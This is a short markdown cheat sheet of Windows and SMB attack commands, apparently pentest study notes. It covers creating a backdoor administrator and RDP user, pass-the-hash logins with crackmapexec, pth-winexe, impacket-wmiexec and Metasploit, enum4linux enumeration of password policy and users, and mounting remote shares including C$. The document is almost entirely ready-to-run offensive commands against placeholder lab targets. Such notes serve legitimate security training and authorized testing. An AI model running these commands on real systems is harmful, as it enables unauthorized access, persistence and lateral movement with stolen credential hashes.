#### account management
-----
*add new user*

```net user <username> <password> /add```

*add <username> to local administrators group*

```net localgroup administrators <username> /add```

*add <username> to remote desktop users group*

```net localgroup "Remote Desktop Users" <username> /add```

*start remote desktop*

```net start TermService```


#### pass the hash
-----
```crackmapexec 10.11.0.1/24 -u <username> -H <HASH_TO_PASS>```

```pth-winexe -U DOMAIN/USERNAME%HASH //target.lab cmd.exe

```impacket-wmiexec -hashes :somehashhere someone@target.lab```

```metasploit module "auxiliary/smb_login"```


#### enum4linux
-----
*query password policy*

```enum4linux -P x.x.x.x```

*enumerate everything*

```enum4linux -a x.x.x.x```


#### smbclient
-----
*show available shares*

```smbclient -L x.x.x.x```

*interact with share*

```smbclient \\\\somewhere\\public -U <username>```


#### smbmount
-----
```mkdir /mnt/someshare```

```smbmount //winpc/shared /mnt/someshare -o username=user,password=pass,rw```

```smbmount //winpc/shared /mnt/ssomeshare -o rw  (no user + pass)```

```mount -t smbfs -o username=<username> \\\\x.x.x.x\\c$ /mnt/example```

```smbmount \\\\x.x.x.x\\c$ /mnt/example -o username=<username>```



